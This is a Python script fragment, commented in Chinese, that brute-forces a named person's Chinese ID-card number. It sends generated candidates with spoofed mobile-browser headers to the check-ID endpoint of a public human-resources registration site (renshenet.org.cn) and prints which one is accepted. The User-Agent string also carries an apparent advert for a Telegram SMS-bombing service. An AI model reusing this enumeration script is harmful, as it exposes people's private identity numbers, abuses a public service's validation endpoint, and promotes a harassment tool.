# 验证身份证号码
for idcard in generated_idcards:
    headers = {
        'Host': 'www.renshenet.org.cn',
        'Accept': 'application/json, text/plain, */*',
        'Sec-Fetch-Site': 'same-origin',
        'depCode': '0004',
        'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Sec-Fetch-Mode': 'cors',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://www.renshenet.org.cn',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.TG 短信轰炸接口.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.TG 短信轰炸接口',
        'Referer': 'https://www.renshenet.org.cn/jxzhrsdist/index.html',
        'Content-Length': '47',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty'
    }

    data = {
        "idcard": idcard,
        "name": name
    }

    try:
        response = requests.post('https://www.renshenet.org.cn/mobile/person/register/checkidcard', headers=headers,
                                 json=data)
        response.raise_for_status()  # 对于错误响应引发异常
        result =  response.json().get("data", {}).get("isSucces")

        print(response.json().get("data", {}))
        print(result)
        if response.json().get("data", {}).get("isSucces"):
            print(f"身份证号码 {idcard} ✅验证通过")
        else:
            print(f"身份证号码 {idcard} ❌验证未通过")
    except requests.exceptions.RequestException as e:
        print(f"请求错误: {e}")